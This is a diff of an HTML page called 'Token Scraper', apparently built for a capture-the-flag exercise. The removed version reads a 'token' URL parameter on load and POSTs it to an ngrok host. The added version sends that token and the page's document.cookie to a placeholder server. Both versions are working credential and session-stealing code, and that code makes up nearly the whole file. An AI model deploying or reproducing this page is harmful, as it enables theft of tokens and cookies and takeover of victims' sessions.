@@ -3,29 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <title>Token Scraper</title>
-  <script type="text/javascript">
-    window.onload = function() {
-      // This function parses the token from the query string in the URL
-      function getParameterByName(name) {
-        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-        var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
-        results = regex.exec(location.search);
-        return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
-      }
-      
-      // Retrieve the token
-      var token = getParameterByName('token');
-
-      // Send the token to your server
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://277f-85-191-43-72.ngrok-free.app/receive_token", true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("token=" + encodeURIComponent(token));
-    };
-  </script>
 </head>
 <body>
-  <p>If you're seeing this, the script has already executed ASDASDSADASDSADASD.</p>
-   <script src="flag.js"></script>
+  <p>If you're seeing this, the script has already executed.</p>
+
+  <script type="text/javascript">
+    // Function to send data to your server
+    function sendData(data) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://your-server.example.com/receive", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send(data);
+    }
+
+    // Function to parse a value from the query string
+    function getParameterByName(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+      results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+    
+    // Retrieve the token and cookie
+    var token = getParameterByName('token');
+    var cookieValue = document.cookie; // Get the cookie value
+
+    // Send the token and cookie to your server
+    sendData("token=" + encodeURIComponent(token) + "&cookie=" + encodeURIComponent(cookieValue));
+  </script>
+
 </body>
 </html>
